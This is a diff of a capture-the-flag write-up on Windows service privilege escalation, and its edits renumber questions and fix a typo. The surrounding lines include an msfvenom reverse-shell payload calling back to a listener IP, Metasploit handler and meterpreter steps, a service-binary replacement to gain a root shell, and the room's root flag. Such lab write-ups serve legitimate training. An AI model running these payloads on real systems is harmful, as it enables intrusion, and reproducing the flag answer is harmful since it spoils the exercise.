@@ -213,7 +213,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.242.20 LPORT=4443 -e x86/shikat
 ```
 {: .nolineno }
 
-Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
+Q2. Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
 
 Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
 
@@ -243,7 +243,7 @@ msf6 exploit(multi/handler) > run
 ```
 {: .nolineno }
 
-Now lets replace the service binary om previous terminal:
+Now lets replace the service binary on previous terminal:
 
 ```bash
 meterpreter > load powershell
@@ -299,9 +299,7 @@ type root.txt
 ```
 {: .nolineno }
 
-Q2 done
 
-
-Q4. What is the root flag?
+Q3. What is the root flag?
 
 > "9af5f314f57607c00fd09803a587db80"
